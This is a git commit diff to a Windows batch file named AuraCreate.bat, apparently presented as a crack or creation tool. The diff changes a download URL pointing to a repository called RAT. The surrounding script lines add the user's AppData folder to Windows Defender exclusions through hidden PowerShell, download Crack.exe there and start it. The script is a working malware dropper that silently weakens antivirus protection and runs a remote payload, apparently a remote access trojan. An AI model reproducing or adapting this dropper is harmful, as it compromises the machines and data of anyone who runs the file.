32ab956ad93f8b0b23c6418142bf50138b99eae2
GLICHED-HACKER <143979463+GLICHED-HACKER@users.noreply.github.com>
2025-07-31 14:30:15 -0700

    Update AuraCreate.bat

--- AuraCreate.bat
+++ AuraCreate.bat
@@ -15,7 +15,7 @@ if %errorlevel% NEQ 0 (
 )
 set "APPDATA_PATH=%USERPROFILE%\AppData"
 set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
-set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.png"
+set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.exe"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
